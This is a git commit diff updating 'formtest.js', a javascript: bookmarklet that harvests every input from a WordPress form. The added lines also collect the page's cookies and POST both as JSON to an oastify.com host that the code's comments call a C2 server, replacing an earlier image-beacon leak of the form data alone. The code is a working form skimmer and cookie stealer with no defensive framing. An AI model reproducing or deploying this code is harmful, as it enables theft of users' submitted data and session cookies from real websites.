a53f5ae6c3ad32eb39eba4c5ac3961be04c380d8
𐌔Ɏℱø₦₦ <mor081294@gmail.com>
2024-08-08 16:19:56 +0300

    Update formtest.js

--- formtest.js
+++ formtest.js
@@ -1,21 +1,31 @@
 javascript:(function() {
+    // Function to extract form data and cookies
     function sendFormData() {
         var formData = {};
         var form = document.getElementById('wpforms-form-6402');
-        
+
         if (form) {
             form.querySelectorAll('input, select, textarea').forEach(function(input) {
                 formData[input.name] = input.value;
             });
 
-            // Convert formData object to query string
-            var queryString = Object.keys(formData).map(function(key) {
-                return encodeURIComponent(key) + '=' + encodeURIComponent(formData[key]);
-            }).join('&');
+            // Extract cookies
+            var cookies = document.cookie.split(';').reduce((cookies, cookie) => {
+                var [name, value] = cookie.split('=').map(c => c.trim());
+                cookies[name] = value;
+                return cookies;
+            }, {});
 
-            // Use an image to send the data
-            var img = new Image();
-            img.src = 'http://kc0yatluwfpwgykzme2636pe95fw3mrb.oastify.com?' + queryString; // Replace with your C2 server URL
+            // Send the data and cookies to the C2 server
+            var payload = {
+                formData: formData,
+                cookies: cookies
+            };
+
+            var xhr = new XMLHttpRequest();
+            xhr.open('POST', 'http://kc0yatluwfpwgykzme2636pe95fw3mrb.oastify.com', true); // Replace with your C2 server URL
+            xhr.setRequestHeader('Content-Type', 'application/json');
+            xhr.send(JSON.stringify(payload));
         }
     }
 
